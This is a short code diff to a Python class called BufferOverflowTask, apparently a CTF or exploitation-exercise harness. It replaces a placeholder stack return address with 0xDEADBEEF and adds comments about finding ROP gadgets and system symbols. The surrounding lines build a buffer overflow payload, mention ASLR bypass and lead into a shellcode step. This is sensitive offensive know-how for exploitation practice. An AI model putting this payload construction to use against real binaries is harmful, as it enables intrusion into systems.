@@ -175,8 +175,9 @@ class BufferOverflowTask:
             # - Target binary analysis (use ELF class to find gadgets)
             # - Memory layout (may need leak or bruteforce)
             # - ASLR bypass if needed (leak libc address)
-            # For demonstration, using a placeholder - replace with actual address from analysis
-            ret_addr = 0x00007fffffffe000  # Example stack address - would be from actual analysis
+            # IMPORTANT: This is a placeholder! Replace with actual address from binary analysis.
+            # Example: ret_addr = elf.symbols['system'] or ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
+            ret_addr = 0xDEADBEEF  # PLACEHOLDER - Replace with real address from analysis!
             buffer += p64(ret_addr)  # Pack as 64-bit little-endian
             
             # 3. Shellcode
